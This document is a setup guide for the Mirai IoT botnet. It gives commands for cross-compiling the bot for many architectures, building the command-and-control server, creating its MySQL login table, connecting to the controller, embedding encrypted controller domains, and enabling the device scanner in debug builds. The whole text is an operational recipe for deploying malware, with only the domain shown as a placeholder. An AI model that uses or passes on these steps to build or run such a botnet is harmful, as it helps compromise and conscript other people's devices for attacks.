# Mirai Setup Instruction

## Step 1: Update and upgrade, 
use root priviledge to make things easier
```
sudo su
apt-get update -y
apt-get upgrade -y
```

## Step 2: run cross-compile.sh 
navigate into the scripts folder  
This script download and compile xcompiler for you.  
See script for detail.
```
cd scripts
./xcompile.sh
```

## Step 3: export path
```
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
 
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go
```

## Step 3: Install packages:
```	
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords
```

## Step 4: building mirai
Naviage to the mirai folder and do the following command  
the output files will be in the debug folder, with cnc and mirai.dbg
```	
./build.sh debug telnet
```

## Step 5: Database setup 
This is for secure database installation
Set up Table and create user  
(read the last line in db.sql, that's the user that we create to log in to cnc)

```
/usr/bin/mysql_secure_installation
cd scripts
mysql -u root -p
-enter password-
source db.sql;
use mirai;
INSERT INTO users VALUES (NULL, 'root', 'password', 0, 0, 0, 0, -1, 1, 30, '');
quit;
```


## Step 6: Database continuing
edit main.go file located in ../mirai/cnc  
assuming you set the database password as root

e.g.
```
const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "root"
const DatabaseTable string  = "mirai"
```

## Step 7: to run cnc
1. 
restart mysql: service mysql restart  
navigate to debug foler: cd /mirai/debug  
run the cnc: ./cnc

2. then telnet to access cnc
in windows or ubuntu, use Putty; in Mac, simply telnet in terminal
e.g.
telnet localhost

login credential(set in step 5):  
username: root  
password: root


**setup complete**
***


## Other configuration:
### table.c:
we need to encrypt cnc-domain and report domain and put it in table.c  
Mirai use this to resovle your domain

run:
```
./enc ip 127.0.0.1 or ./enc string www.example.com 
```
If you want to build the release version, remember to copy promtp.txt into the release folder, because admin.go file reads it, if the file not found, will not create connection.

In debug mode, the scanner is turn-off by default, need to edit it in mian.c:158 , so the scanner can run in debug mode.

**Very Important!!**: use sudo to execute!!! 





